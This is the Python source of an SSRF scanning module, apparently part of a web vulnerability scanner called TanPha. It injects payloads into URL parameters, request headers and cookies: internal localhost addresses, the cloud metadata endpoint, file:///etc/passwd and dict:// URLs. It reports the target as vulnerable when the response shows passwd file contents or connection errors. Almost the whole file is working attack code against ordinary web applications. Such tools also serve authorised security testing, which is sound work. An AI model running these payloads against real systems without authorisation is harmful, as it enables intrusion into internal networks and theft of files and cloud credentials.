"""SSRF Module for TanPha V4.0 (Multi-Vector + Error-Based)."""
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

class SSRFModule(BaseModule):
    name = "ServerSideRequestForgery"
    module_id = "ssrf"
    version = "4.0 (Multi-Vector + Error-Based)"
    vulnerability_class = "SSRF"
    default_impact = "INTERNAL_NETWORK_ACCESS"
    default_privilege = "SERVER"

    COMMON_INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Original-URL", "X-Rewrite-URL", "X-Client-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-Real-IP", "Forwarded", "Origin",
        "Accept-Language", "Cookie"
    ]
    POST_BODY = {"Submit": "Submit", "answer": "answer"}

    # Payload SSRF Klasik
    SSRF_PAYLOADS = [
        "http://127.0.0.1:80",
        "http://127.0.0.1:8443",
        "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:8443/"
    ]

    # Penanda kalau server mencoba melakukan request (Error-Based)
    SSRF_ERROR_MARKERS = [
        "connection refused",
        "could not connect",
        "failed to open stream",
        "curl error",
        "java.net.connectexception",
        "operation timed out",
        "no route to host"
    ]

    # Penanda kalau file kebaca
    SSRF_FILE_MARKERS = [
        "root:x:0:0:",
        "root:*:0:0:"
    ]

    def __init__(self):
        super().__init__()

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            context.discovery.parameters = ["url"]
        return True

    @staticmethod
    def _decode(text: str) -> str:
        try:
            return html.unescape(text)
        except Exception:
            return text

    @staticmethod
    def _servlet_url(url: str) -> str:
        p = urlparse(url)
        path = p.path
        if path.endswith(".html"):
            path = path[:-5]
        return f"{p.scheme}://{p.netloc}{path}"

    def _is_ssrf_output(self, text: str) -> tuple[bool, str]:
        decoded = self._decode(text).lower()
        if any(m in decoded for m in self.SSRF_FILE_MARKERS):
            return True, "FILE_READ"
        if any(m in decoded for m in self.SSRF_ERROR_MARKERS):
            return True, "ERROR_BASED"
        return False, ""

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
        if not new_qs: new_qs = [(param, payload)]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe=":/")))

    def _send_payload(self, context, param, payload, auth_checker=None, timeout=10):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            res = context.http_client.request(
                "GET", target_url, target_param=param,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
            return res.response if res and res.response is not None else None
        else:
            data = {param: payload, "Submit": "Submit"}
            res = context.http_client.request(
                "POST", context.target.base_url, data=data,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
            return res.response if res and res.response is not None else None

    def _send_header_payload(self, context, header_name, payload, auth_checker=None, timeout=10, method="GET"):
        headers = {header_name: payload}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _send_cookie_payload(self, context, cookie_name, payload, auth_checker=None, timeout=10, method="GET"):
        headers = {"Cookie": f"{cookie_name}={payload}"}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _test_ssrf(self, context, param, sender_func, injection_point="PARAM"):
        for payload in self.SSRF_PAYLOADS:
            result = sender_func(payload)
            if result is not None and result.text:
                is_ssrf, reason = self._is_ssrf_output(result.text)
                if is_ssrf:
                    print(f"      [!!] SSRF CONFIRMED on '{param}' via {injection_point} (Payload: {payload}) - {reason}!")
                    return Evidence(
                        attempt_id=f"ssrf_{injection_point.lower()}", 
                        module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="INTERNAL_REQUEST",
                        reason_code="SSRF_CONFIRMED", reason_detail=f"SSRF behavior detected: {reason}",
                        confidence=0.95, evidence_text=f"SSRF via {reason}", assess_payload=payload
                    )
        return None

    def assess(self, context: TargetContext, auth_checker=None) -> list[Evidence]:
        evidence_pool = []

        # 1. Parameters (GET / POST)
        for param in context.discovery.parameters:
            print(f"      [>] Testing SSRF on param '{param}'...")
            sender = lambda p: self._send_payload(context, param, p, auth_checker)
            ev = self._test_ssrf(context, param, sender, "PARAM")
            if ev:
                evidence_pool.append(ev)
                continue

        # 2. Headers
        headers_to_test = list(context.discovery.parameters)
        headers_to_test.extend(self.COMMON_INJECTABLE_HEADERS)
        seen = set()
        headers_to_test = [x for x in headers_to_test if not (x.lower() in seen or seen.add(x.lower()))]

        print(f"      [>] Testing SSRF via {len(headers_to_test)} headers (GET+POST)...")
        for header_name in headers_to_test:
            ev_found = False
            for method in ("GET", "POST"):
                sender = lambda p, h=header_name, m=method: self._send_header_payload(context, h, p, auth_checker, method=m)
                ev = self._test_ssrf(context, header_name, sender, "HEADER")
                if ev:
                    evidence_pool.append(ev)
                    ev_found = True
                    break
            if ev_found:
                print(f"      [+] Stop testing more headers, found vuln in '{header_name}'.")
                break

        # 3. Cookies
        cookie_names = list(context.discovery.parameters)
        try:
            base_res = context.http_client.request("GET", context.target.base_url, auth_checker=auth_checker, bypass_mutation=True)
            if base_res and base_res.success and base_res.response:
                for set_cookie in base_res.response.headers.get("Set-Cookie", "").split(","):
                    cname = set_cookie.split("=")[0].strip()
                    if cname and cname not in cookie_names:
                        cookie_names.append(cname)
        except Exception:
            pass

        print(f"      [>] Testing SSRF via {len(cookie_names)} cookies (GET+POST)...")
        for cookie_name in cookie_names:
            ev_found = False
            for method in ("GET", "POST"):
                sender = lambda p, c=cookie_name, m=method: self._send_cookie_payload(context, c, p, auth_checker, method=m)
                ev = self._test_ssrf(context, cookie_name, sender, "COOKIE")
                if ev:
                    evidence_pool.append(ev)
                    ev_found = True
                    break
            if ev_found:
                print(f"      [+] Stop testing more cookies, found vuln in '{cookie_name}'.")
                break

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code == "SSRF_CONFIRMED":
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.95, "SSRF_CONFIRMED",
                "SSRF behavior detected.", verify_payload=evidence.assess_payload
            )
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] SSRF EXPLOITATION [***]")
        print(f"[*] Target: {finding.location}")
        print(f"[*] Parameter: '{finding.parameter}'")
        print(f"[*] Payload: {finding.verify_payload}")
